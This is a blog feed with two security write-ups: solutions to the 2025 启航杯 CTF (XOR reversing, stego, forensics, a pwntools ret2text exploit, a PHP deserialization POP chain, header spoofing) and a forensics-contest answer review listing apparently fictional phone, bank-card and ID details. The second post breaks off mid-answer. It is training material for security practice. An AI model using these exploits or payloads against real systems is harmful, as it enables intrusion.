<?xml version="1.0" encoding="utf-8"?>
<feed xmlns="http://www.w3.org/2005/Atom">
  <title>w3nx1z1</title>
  
  <subtitle>w3nx1z1 Blog</subtitle>
  <link href="http://w3nx1z1.github.io/atom.xml" rel="self"/>
  
  <link href="http://w3nx1z1.github.io/"/>
  <updated>2025-02-14T08:30:17.438Z</updated>
  <id>http://w3nx1z1.github.io/</id>
  
  <author>
    <name>w3nx1z1</name>
    
  </author>
  
  <generator uri="https://hexo.io/">Hexo</generator>
  
  <entry>
    <title>2025启航杯wp</title>
    <link href="http://w3nx1z1.github.io/posts/6f5a3cd.html"/>
    <id>http://w3nx1z1.github.io/posts/6f5a3cd.html</id>
    <published>2025-01-25T15:56:54.364Z</published>
    <updated>2025-02-14T08:30:17.438Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2025启航杯wp"><a href="#2025启航杯wp" class="headerlink" title="2025启航杯wp"></a>2025启航杯wp</h1><p>本次启航杯可以说是槽点满满 本来和几位师傅一起想冲击第一 但是最后就差一道win06 遗憾第二 拼尽全力无法战胜</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501271759791.png" alt="image-20250127175934584"></p><h2 id="re"><a href="#re" class="headerlink" title="re"></a>re</h2><h3 id="Checker"><a href="#Checker" class="headerlink" title="Checker"></a>Checker</h3><ol><li>就一个xor 0x23直接秒了</li></ol><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280021356.png"></p><ol start="2"><li>EXP</li></ol><pre><code class="plain">data = [0x72, 0x6B, 0x60, 0x77, 0x65, 0x58, 0x46, 0x46, 0x15, 0x40,   0x14, 0x41, 0x1A, 0x40, 0x0E, 0x46, 0x14, 0x45, 0x16, 0x0E,   0x17, 0x45, 0x42, 0x41, 0x0E, 0x1A, 0x41, 0x47, 0x45, 0x0E,   0x46, 0x42, 0x13, 0x14, 0x46, 0x13, 0x10, 0x17, 0x45, 0x15,   0x42, 0x16, 0x5E]for i in data:    print(chr(i ^ 0x23),end=&quot;&quot;)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280021035.png"></p><h3 id="rainbow"><a href="#rainbow" class="headerlink" title="rainbow"></a>rainbow</h3><ol><li>别的都不重要直接看xor函数发现就是异或了90</li></ol><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280021340.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280021550.png"></p><ol start="2"><li>EXP</li></ol><pre><code class="plain">import binasciidata = binascii.a2b_hex(&quot;0B12190E1C213B6268686C6B6A69776F3B633B776E3C3B6D773B38393C773E3F3B6E69623B6D393F6D6227&quot;)for i in data:    print(chr(i ^ 90),end=&quot;&quot;)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280021923.png"></p><h3 id="小明的note"><a href="#小明的note" class="headerlink" title="小明的note"></a>小明的note</h3><ol><li>程序加了UPX的壳，linux的upx -d脱壳就行，就是一个xor而已</li></ol><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280022446.png"></p><ol start="2"><li>EXP</li></ol><pre><code class="plain">enc = [  0x12, 0x7D, 0xE1, 0x2C, 0x01, 0x4A, 0xC4, 0x45, 0x78, 0x5E,  0xC9, 0x46, 0x78, 0x5D, 0x83, 0x0F, 0x37, 0x12, 0xD0, 0x45,  0x63, 0x42, 0xD5, 0x57, 0x76, 0x14, 0xDE, 0x06, 0x6E, 0x04,  0x8F, 0x3E, 0x50, 0x21, 0xE1, 0x3B, 0x53, 0x72, 0xB7, 0x6C,  0x5D, 0x79, 0xF7]key = [0x42,0x37,0xa1,0x7c]for i in range(len(enc)):    enc[i] ^= i + 1    enc[i] ^= key[i % 4]print(bytes(enc))</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280022049.png"></p><h2 id="misc"><a href="#misc" class="headerlink" title="misc"></a>misc</h2><h3 id="请找出拍摄地所在位置"><a href="#请找出拍摄地所在位置" class="headerlink" title="请找出拍摄地所在位置"></a>请找出拍摄地所在位置</h3><p>通过右上角的广告可得柳城县</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280022551.png"></p><p>通过雅迪和绿源等标志物可得flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280022654.png"></p><h3 id="QHCTF-For-Year-2025"><a href="#QHCTF-For-Year-2025" class="headerlink" title="QHCTF For Year 2025"></a>QHCTF For Year 2025</h3><p>原题</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280022554.jpeg"></p><h3 id="启动！"><a href="#启动！" class="headerlink" title="______启动！"></a>______启动！</h3><p>筛选http流量 发现log目录的Post请求</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280025426.png"></p><p>访问<a href="http://101.126.66.65/log">http://101.126.66.65/log</a>，下载log文件即得flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280022991.png"></p><h3 id="PvzHE"><a href="#PvzHE" class="headerlink" title="PvzHE"></a>PvzHE</h3><p>直接从图像里面找</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280022190.png"></p><h3 id="你能看懂这串未知的文字吗"><a href="#你能看懂这串未知的文字吗" class="headerlink" title="你能看懂这串未知的文字吗"></a>你能看懂这串未知的文字吗</h3><p>从网上找一下类似的字体 贴吧中发现是羊文</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280022132.png"></p><p>按照题目给的图片进行转换</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280023263.png"></p><p>一眼顶针 确定为szfpguwizgwesqzoaoerv</p><p>然后png图片存在lsb隐写 得到key qihangbeiiseasy</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280022519.png"></p><p>维吉尼亚 解密得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280023344.png"></p><h3 id="猿类的编程语言你了解吗"><a href="#猿类的编程语言你了解吗" class="headerlink" title="猿类的编程语言你了解吗"></a>猿类的编程语言你了解吗</h3><p>jphs隐写 但是无密码</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280023042.png"></p><p>提出来密文 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280023278.png"></p><p>Ook! to text</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280023024.png"></p><h3 id="你猜猜这是哪"><a href="#你猜猜这是哪" class="headerlink" title="你猜猜这是哪"></a>你猜猜这是哪</h3><p>问到了本地人<br><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280023631.png"></p><h2 id="pwn"><a href="#pwn" class="headerlink" title="pwn"></a>pwn</h2><h3 id="easy-pwn"><a href="#easy-pwn" class="headerlink" title="easy_pwn"></a>easy_pwn</h3><ol><li>没啥好说的ret2text</li></ol><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280023251.png"></p><p><img src="https://cdn.nlark.com/yuque/0/2025/png/35924193/1737807733822-7cfc6bd1-f68d-40b6-9de2-90161cc5f1f8.png"></p><ol start="2"><li>EXP</li></ol><pre><code class="plain">from pwn import *io = remote(&quot;challenge.qihangcup.cn&quot;,35089)io.sendline(&quot;a&quot; * 0x58 + p64(0x00000000004011CA))io.interactive()</code></pre><h2 id="crypto"><a href="#crypto" class="headerlink" title="crypto"></a>crypto</h2><h3 id="easyrsa"><a href="#easyrsa" class="headerlink" title="easyrsa"></a>easyrsa</h3><p>gpt一把梭</p><pre><code class="python">from Crypto.PublicKey import RSAfrom Crypto.Cipher import PKCS1_OAEPimport base64# 私钥（直接从提供的 private_key 变量获取）private_key = b&#39;&#39;&#39;-----BEGIN RSA PRIVATE KEY-----MIICXQIBAAKBgQCrIhp66syyQ8bOfTRjPJ+8Q2B9V2mfYIcQGUGx2RVfoWD6iY8NgYBsA3ksoZgv9tz+MXehdeeImNtAmZo3YZKHSQLAx+bJ2R+IUImVmY5vcMMVzn7ez2TBKlrhOWQvqGMgFMqeHG2JWTo27lZBApK3fkpBBRMQA/pBqDD1tMOfeQIDAQABAoGAEA1AWkQuKWW7FEDhNOe0UevTSp50MqCoD9tWnVBv3/WaoOqzMitHTkUFzNO8GyT2y0RSOiD9iS377sjEPX/s8ZU8mD4v8Hp6GWWQeSLy1N5/7DCo8sBO7BspKa+pQOPluEYgAUAp9oPm0YR9XvFUfoV7lrSju2dPWsNqZ69XT5sCQQDE/fwjlXhfeeyEwKC226haT11ml1h51/6+CgWAG9IUvsu0MSBRFKoh5iwBlW2lDUFwRGMORtbklacCfUmVE9UPAkEA3mUrse9a2xReh3UjIsON7gQqbxbhCJ+5uQWlgIlirAcMotTjulG6sSW+VyBszj5fPbkQwTeDZSUXlB0WB/oS9wJATflO1XLzq68iHMX2l4rIz758dQBRKCGEFwr2dGgOtuFy1kdfyFhKo5JtNs9EEEH39g1LvDn0E5Tc/5JCDv1DpwJBAM6GLTmkCT+BfvdT9DkIWPk7rRxUps2XZqVHdRYUfyk5sqZUBNa1pyVy43uNhP1SNqffAIwtvTtkYq0NBbSKqqkCQQCN1FuNAxL56z8HOUt4zG/PQ17b1nZnOZNN+m86sC53Syqw75NOSUvu9BAxyw3Y9V0UkhkNr6gG9D57CJ5DJVWS-----END RSA PRIVATE KEY-----&#39;&#39;&#39;# 加密的消息（从给定的加密消息中提取）encrypted_message = &quot;DFuPRH4PXGX73aMYPdQmjaZ1Ppls7RyMvRzskDwupPmWiStFs4A6r3sDW4vuuteWExa/krMhKqDQpndNL9mljzSRd6Tay16ca21apo3frXy+RovbAbYZNJx8+VZn5umZpKCh+y3ysf8FURVI5g+K35S03Xp2ofWO4LI1h2riGT8=&quot;def decrypt_message(encrypted_message, private_key):    # 导入私钥    key = RSA.import_key(private_key)    cipher = PKCS1_OAEP.new(key)        # 解密    encrypted_message_bytes = base64.b64decode(encrypted_message)    decrypted_message = cipher.decrypt(encrypted_message_bytes)    return decrypted_message.decode()# 解密并打印消息decrypted_message = decrypt_message(encrypted_message, private_key)print(&quot;解密后的消息:&quot;)print(decrypted_message)</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280023198.png"></p><h2 id="forensic"><a href="#forensic" class="headerlink" title="forensic"></a>forensic</h2><h3 id="Win-01"><a href="#Win-01" class="headerlink" title="Win_01"></a>Win_01</h3><pre><code>某天，小明正在某网站进行学习。突然，一位蛤客盯上了他，并向他发送了一封钓鱼邮件。由于小明刚接触网络安全，对钓鱼邮件并不熟悉，他不小心下载并点击了邮件中的附件。当他后来学习到钓鱼邮件的相关知识时，已经为时晚矣。于是，他请求你帮助找出蛤客的痕迹。请你针对附件镜像进行一次应急响应，查找以下flag值。压缩包附件的解压密码为：90382728-ca22-48e7-8413-61f6438f1b90。请以QHCTF&#123;xxxxxxxx&#125;的格式提交结果。1.找出系统中蛤客的ip地址及端口，提交方式请以QHCTF&#123;md5(127.0.0.1:80)&#125;进行提交，</code></pre><p>在翻的时候在黑客创建的用户文件夹中找到一个可疑exe</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280023265.png"></p><p>放沙箱分析<img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280023557.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280023099.png"></p><h3 id="Win-02"><a href="#Win-02" class="headerlink" title="Win_02"></a>Win_02</h3><pre><code>2.蛤客在控制小明的系统后，创建了一个最高权限的后门账户，请你找出该账户的用户名及密码，提交方式请以QHCTF&#123;md5(user_password)&#125;进行提交</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280023395.png"></p><h3 id="win-04"><a href="#win-04" class="headerlink" title="win_04"></a>win_04</h3><pre><code>4.蛤客在home目录中存放了一个恶意程序，请你分析该程序，并找到其中的flag值</code></pre><p>在admin用户桌面上找到一个hacker.exe</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280023959.png"></p><p>导出看图标发现是python打包的 解个包先 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280023618.png"></p><p>找个网站反编译pyc文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280023595.png"></p><p>写解密脚本</p><pre><code class="python">def xor_encrypt(data, key):    # Repeat the key to match the length of the data    repeated_key = (key * (len(data) // len(key) + 1))[:len(data)]    # XOR each byte of data with the corresponding byte in the repeated key    return bytes([data[i] ^ repeated_key[i] for i in range(len(data))])import base64enc = &quot;HgIlNCQUF0MZRA0FMhwODBsTNjM4OQ8RMA81SCImFhQeVkQdCUJfMBs0Mx0fGVowIyoTJ0cdHCwKVwxIOQQCRA==&quot;xor_key = b&#39;qihangcup&#39;aes_key = b&#39;acf8bafa15f8cb03&#39;enc = bytearray(base64.b64decode(enc))res = xor_encrypt(enc, xor_key)aes_enc = base64.b64decode(res)from Crypto.Cipher import AESaes = AES.new(key=aes_key,mode=AES.MODE_ECB)print(aes.decrypt(aes_enc))# b&#39;QHCTF&#123;8b0c14a8-5823-46fd-a547-0dcdc404a7ed&#125;\x05\x05\x05\x05\x05&#39;</code></pre><h3 id="win-05"><a href="#win-05" class="headerlink" title="win_05"></a>win_05</h3><pre><code>5.小明在找你帮忙之前，喊了他的一位好友帮他先行取证，请你找出他好友远程所使用的软件，并找出控制了多少秒，ip是什么，提交方式请以QHCTF&#123;md5(xxxx_10_127.0.0.1)&#125;进行提交，例如：QHCTF&#123;cef54f47984626c9efbf070c50bfad1b&#125;</code></pre><p>火眼梭出ip和工具名</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280024804.png"></p><p>但是时间不对 去翻日志</p><p>这里找的方法是 直接在todesk的日志文件夹中全局搜索关键词<code>tcp begin connect</code> 找到的ip对应的端口不为443的 就是外连ip</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280024754.png"></p><p>看着反而像14:40:01开始14:53:01结束的 尝试交780秒到788秒的flag 发现781是对的 (吐槽一点工具名竟然是Todesk d不大写 明明官方名字就是ToDesk)</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280024094.png"></p><h3 id="win-06-赛后复盘"><a href="#win-06-赛后复盘" class="headerlink" title="win_06(赛后复盘)"></a>win_06(赛后复盘)</h3><pre><code>6.请你找出蛤客在启动项中藏的flag提交方式：QHCTF&#123;xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx&#125;</code></pre><p>常规的启动项翻了个遍也没找到 赛后得知是从Windows Defender中找到查杀记录 </p><p>按照这个顺序 打开查杀历史</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501271842598.png" alt="image-20250127184232492"></p><p>但是打开只能看到我们在win01中已经分析过的Server2.exe的删除记录</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501271845902.png" alt="image-20250127184536824"></p><p>找到一个项目来进行恢复<a href="https://github.com/CyberGoatherder/WinDefReleaser">https://github.com/CyberGoatherder/WinDefReleaser</a></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501271846124.png" alt="image-20250127184611693"></p><p>打开start文件 找到一段可疑字符串</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501271847967.png" alt="image-20250127184724839"></p><p>base64套娃解密得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501271847656.png" alt="image-20250127184750532"></p><h3 id="win-07"><a href="#win-07" class="headerlink" title="win_07"></a>win_07</h3><pre><code>7.蛤客在系统数据库中藏了一些东西，请你找出其中的flag值提交方式：QHCTF&#123;xxxxxx-xxxx-xxxx-xxxx-xxxxxxxx&#125;</code></pre><p>在HackY$用户桌面上找到一个flag.zip bandzip打开看到注释部分提示了密码在环境变量里面</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280024611.png"></p><p>仿真起计算机镜像 cmd输入set查看环境变量</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280024287.png"></p><p>解压解base64得到flag</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280024564.png"></p><h2 id="web"><a href="#web" class="headerlink" title="web"></a>web</h2><h3 id="include"><a href="#include" class="headerlink" title="include"></a>include</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280024299.png"></p><h3 id="pop"><a href="#pop" class="headerlink" title="pop"></a>pop</h3><pre><code class="python">&lt;?phpclass Start&#123;    public $name;    public $func;&#125;class Sec&#123;    public $obj;    public $var;&#125;class Easy&#123;    public $cla;&#125;class eeee&#123;    public $obj;&#125;$a = new Sec();$b = new Start();$b-&gt;func = $a;$c = new eeee();$c-&gt;obj = $b;$d = new Sec();$e = new Easy();$d-&gt;obj = $e;$d-&gt;var = $c;$f = new Start();$f-&gt;name = $d;echo urlencode(serialize($f));</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280024521.png"></p><h3 id="PCREmagic"><a href="#PCREmagic" class="headerlink" title="PCREmagic"></a>PCREmagic</h3><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280024664.png"></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280024579.png"></p><h3 id="Web-IP"><a href="#Web-IP" class="headerlink" title="Web_IP"></a><strong>Web_IP</strong></h3><p>x-forwarded-for伪造</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501280024208.png"></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h1 id=&quot;2025启航杯wp&quot;&gt;&lt;a href=&quot;#2025启航杯wp&quot; class=&quot;headerlink&quot; title=&quot;2025启航杯wp&quot;&gt;&lt;/a&gt;2025启航杯wp&lt;/h1&gt;&lt;p&gt;本次启航杯可以说是槽点满满 本来和几位师傅一起想冲击第一 但是最后就差一道win06</summary>
      
    
    
    
    <category term="ctf" scheme="http://w3nx1z1.github.io/categories/ctf/"/>
    
    
    <category term="misc" scheme="http://w3nx1z1.github.io/tags/misc/"/>
    
    <category term="crypto" scheme="http://w3nx1z1.github.io/tags/crypto/"/>
    
    <category term="web" scheme="http://w3nx1z1.github.io/tags/web/"/>
    
    <category term="re" scheme="http://w3nx1z1.github.io/tags/re/"/>
    
    <category term="forensics" scheme="http://w3nx1z1.github.io/tags/forensics/"/>
    
  </entry>
  
  <entry>
    <title>2025龙信考核比武</title>
    <link href="http://w3nx1z1.github.io/posts/2f21d3bc.html"/>
    <id>http://w3nx1z1.github.io/posts/2f21d3bc.html</id>
    <published>2025-01-11T01:20:22.398Z</published>
    <updated>2025-02-14T08:30:17.413Z</updated>
    
    <content type="html"><![CDATA[<h1 id="2025龙信考核比武"><a href="#2025龙信考核比武" class="headerlink" title="2025龙信考核比武"></a>2025龙信考核比武</h1><p>很奇妙的一次体验，主办方提供的检材在比赛当天凌晨发现出问题了，临时又进行更换，好在睡得晚及时重新下载了</p><p>本身题的难度不是很高，但不知道为啥做的时候脑子好像短路了一样，在这里写个复盘 仅代表个人观点 正确答案以官方公布为准 欢迎师傅们来交流</p><pre><code>镜像链接：https://pan.baidu.com/s/1a9bQ4S5Soz5L6nSvkmiPIg?pwd=6j6r容器密码：MjAyNeWKoOayuQ==</code></pre><h2 id="1-分析手机备份，该机主的qq号为"><a href="#1-分析手机备份，该机主的qq号为" class="headerlink" title="1.分析手机备份，该机主的qq号为"></a>1.分析手机备份，该机主的qq号为</h2><pre><code>1203494553</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501121447718.png" alt="image-20250111103104452"></p><h2 id="2-分析手机备份文件，该机主的微信号为？（标准格式：abcdefg）"><a href="#2-分析手机备份文件，该机主的微信号为？（标准格式：abcdefg）" class="headerlink" title="2.分析手机备份文件，该机主的微信号为？（标准格式：abcdefg）"></a>2.分析手机备份文件，该机主的微信号为？（标准格式：abcdefg）</h2><pre><code>wxid_oa8u5syonjcp22</code></pre><p>这里应该写的是微信内部id</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501110934435.png" alt="image-20250111093437357"></p><h2 id="3-请问该手机机主微信共有-个现有好友？（标准格式：12）"><a href="#3-请问该手机机主微信共有-个现有好友？（标准格式：12）" class="headerlink" title="3.请问该手机机主微信共有_____个现有好友？（标准格式：12）"></a>3.请问该手机机主微信共有_____个现有好友？（标准格式：12）</h2><pre><code>16</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501110935059.png" alt="image-20250111093510944"></p><h2 id="4-请分析机主的银行卡卡号是多少？（标准格式：按照实际值填写）"><a href="#4-请分析机主的银行卡卡号是多少？（标准格式：按照实际值填写）" class="headerlink" title="4.请分析机主的银行卡卡号是多少？（标准格式：按照实际值填写）"></a>4.请分析机主的银行卡卡号是多少？（标准格式：按照实际值填写）</h2><pre><code>6231276371853671344</code></pre><p>这里使用龙信的手机分析可以直接分析出来 </p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501111036006.png" alt="image-20250111103632937"></p><p>当然找数据库也是可以的 路径是<code>data/com.hallo330.app1.YongYou/ab826feedee08f7a50ea89cc830e586e/240199612/msg.db</code></p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131835404.png" alt="image-20250113183508140"></p><h2 id="5-请分析出幕后老大王子勇的最新手机号码是多少？（标准格式：1234567）"><a href="#5-请分析出幕后老大王子勇的最新手机号码是多少？（标准格式：1234567）" class="headerlink" title="5.请分析出幕后老大王子勇的最新手机号码是多少？（标准格式：1234567）"></a>5.请分析出幕后老大王子勇的最新手机号码是多少？（标准格式：1234567）</h2><pre><code>19371263751</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501111033507.png" alt="image-20250111103350446"></p><h2 id="6-请分析幕后老大的可疑的银行卡卡号是多少？（标准格式：按照实际值填写）"><a href="#6-请分析幕后老大的可疑的银行卡卡号是多少？（标准格式：按照实际值填写）" class="headerlink" title="6.请分析幕后老大的可疑的银行卡卡号是多少？（标准格式：按照实际值填写）"></a>6.请分析幕后老大的可疑的银行卡卡号是多少？（标准格式：按照实际值填写）</h2><pre><code>6321456319275323911</code></pre><p>同4题图</p><h2 id="7-请问计算机的网卡MAC地址是多少。（标准格式：00-0S-25-C6-E3-5F"><a href="#7-请问计算机的网卡MAC地址是多少。（标准格式：00-0S-25-C6-E3-5F" class="headerlink" title="7.请问计算机的网卡MAC地址是多少。（标准格式：00-0S-25-C6-E3-5F)"></a>7.请问计算机的网卡MAC地址是多少。（标准格式：00-0S-25-C6-E3-5F)</h2><pre><code class="Bash">00-0C-29-C5-3C-F8</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131818847.png" alt="img"></p><h2 id="8-请问计算机管理员用户的设置密码时间是什么时候。（标准格式：1970-x2F-06-x2F-17-23-25-41）"><a href="#8-请问计算机管理员用户的设置密码时间是什么时候。（标准格式：1970-x2F-06-x2F-17-23-25-41）" class="headerlink" title="8.请问计算机管理员用户的设置密码时间是什么时候。（标准格式：1970&#x2F;06&#x2F;17 23:25:41）"></a>8.请问计算机管理员用户的设置密码时间是什么时候。（标准格式：1970&#x2F;06&#x2F;17 23:25:41）</h2><pre><code class="Bash">2023-06-17 20:35:42</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131818695.png" alt="img"></p><h2 id="9-请分析数据文件夹中的表格文件共有有多少个两个字的姓名人数。（标准格式：10）"><a href="#9-请分析数据文件夹中的表格文件共有有多少个两个字的姓名人数。（标准格式：10）" class="headerlink" title="9.请分析数据文件夹中的表格文件共有有多少个两个字的姓名人数。（标准格式：10）"></a>9.请分析数据文件夹中的表格文件共有有多少个两个字的姓名人数。（标准格式：10）</h2><pre><code class="Bash">908</code></pre><p>首先在计算机Download&#x2F;phpStudy_64文件夹下找到一个vhd虚拟磁盘文件</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131818717.png" alt="img"></p><p>仿真起计算机之后 直接在计算机中双击挂载 就看到有三个文件夹</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131818589.png" alt="img"></p><p>将三个文件夹全部提取出来分析 发现是10个excel表格 记录姓名、电话号码和身份证号</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131818113.png" alt="img"></p><p>一起放到网矩中分析</p><p>写正则表达式来匹配姓名是两个字的</p><pre><code class="Bash">^[\u4e00-\u9fa5]&#123;2&#125;$</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131818025.png" alt="img"></p><h2 id="10-请分析数据文件夹中表格共有表格共有多少个男性。（标准格式：10）"><a href="#10-请分析数据文件夹中表格共有表格共有多少个男性。（标准格式：10）" class="headerlink" title="10.请分析数据文件夹中表格共有表格共有多少个男性。（标准格式：10）"></a>10.请分析数据文件夹中表格共有表格共有多少个男性。（标准格式：10）</h2><pre><code class="Bash">476</code></pre><p>对身份证号进行特定拆分</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131818018.png" alt="img"></p><p>在进行筛选</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131818332.png" alt="img"></p><p>一共是476个男性</p><h2 id="11-请分析数据文件夹中表格共有多少姓陈的人。（标准格式：10）"><a href="#11-请分析数据文件夹中表格共有多少姓陈的人。（标准格式：10）" class="headerlink" title="11.请分析数据文件夹中表格共有多少姓陈的人。（标准格式：10）"></a>11.请分析数据文件夹中表格共有多少姓陈的人。（标准格式：10）</h2><pre><code class="Bash">106</code></pre><p>同样对姓名中包含陈的姓名进行筛选</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131818836.png" alt="img"></p><p>共106个</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131819087.png" alt="img"></p><h2 id="12-请分析数据文件夹中表格共有1950年至1970年的人数是多少。（标准格式：10）"><a href="#12-请分析数据文件夹中表格共有1950年至1970年的人数是多少。（标准格式：10）" class="headerlink" title="12.请分析数据文件夹中表格共有1950年至1970年的人数是多少。（标准格式：10）"></a>12.请分析数据文件夹中表格共有1950年至1970年的人数是多少。（标准格式：10）</h2><pre><code class="Bash">419</code></pre><p>使用正则表达式来筛选</p><pre><code class="Bash">^[1-9]\d&#123;5&#125;(195\d|196\d|1970)((0[1-9])|(10|11|12))(([0-2][1-9])|10|20|30|31)\d&#123;3&#125;[0-9Xx]$</code></pre><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131819762.png" alt="img"></p><h2 id="13-请问计算机映射盘的挂载位置盘符是什么。（标准格式：B）"><a href="#13-请问计算机映射盘的挂载位置盘符是什么。（标准格式：B）" class="headerlink" title="13.请问计算机映射盘的挂载位置盘符是什么。（标准格式：B）"></a>13.请问计算机映射盘的挂载位置盘符是什么。（标准格式：B）</h2><pre><code class="Bash">Z</code></pre><p>samba就是网络映射文件共享服务</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131818495.png" alt="img"></p><h2 id="14-请问机主邮箱账号的显示名称是什么。（标准格式：abcd）"><a href="#14-请问机主邮箱账号的显示名称是什么。（标准格式：abcd）" class="headerlink" title="14.请问机主邮箱账号的显示名称是什么。（标准格式：abcd）"></a>14.请问机主邮箱账号的显示名称是什么。（标准格式：abcd）</h2><pre><code class="Bash">kkkk</code></pre><p>接上题 我们发现计算机和一台ip为192.168.9.36的机器存在网络映射服务 而我们在下面分析服务器的时候发现 嫌疑人在配置宝塔搭建网站的时候配置的ip就是192.168.9.36 也就是说计算机和服务器之间存在网络映射</p><p>我们在桌面上可以发现一个foxmail的快捷方式 但这个快捷方式的起始位置是在Z盘也就是服务器文件夹中</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131818841.png" alt="img"></p><p>我们先配置虚拟网络编辑器 让计算机和服务器都在9这个网段下 DHCP的起始ip从192.168.9.36开始</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131818895.png" alt="img"></p><p>仿真起服务器之后 查看ip 就算分给服务器的ip不是192.168.9.36也没关系 我们可以重新进行映射 映射凭证的账密火眼中已经分析出来了</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131818631.png" alt="img"></p><p>先把原来的映射断开 建立新的映射 文件夹处写\192.168.9.39\samba 点击确认后正常填写凭证账密 成功连接</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131819345.png" alt="img"></p><p>进入sha文件夹 打开foxmail 设置中账号出看到显示名称</p><p><img src="https://raw.githubusercontent.com/w3nx1z1/blogimage/main/202501131818588.png" alt="img"></p><h2 id="15-请问机主邮箱的定时收取邮件是间隔多少分钟。（标准格式：10）"><a href="#15-请问机主邮箱的定时收取邮件是间隔多少分钟。（标准格式：10）" class="headerlink" title="15.请问机主邮箱的定时收取邮件是间隔多少分钟。（标准格式：10）"></a>15.请问机主邮箱的定时收取邮件是间隔多少分钟。（标准格式：10）</h2><pre><code class="Bash">15</code></pre><p>接上题图 间隔15分钟</p><h2 id="16-请问机主邮箱最近一次发送邮件的主题是什么。（标准格式：按照实际值填写）"><a href="#16-请问机主邮箱最近一次发送邮件的主题是什么。（标准格式：按照实际值填写）" class="headerlink" title="16.请问机主邮箱最近一次发送邮件的主题是什么。（标准格式：按照实际值填写）"></a>16.请问机主邮箱最近一次发送邮件的主题是什么。（标准格式：按照实际值填写）</h2><pre><code class="Bash">我是卧龙</code></pre><p>在已发送邮件中看到 最近一次发送邮件的主题是 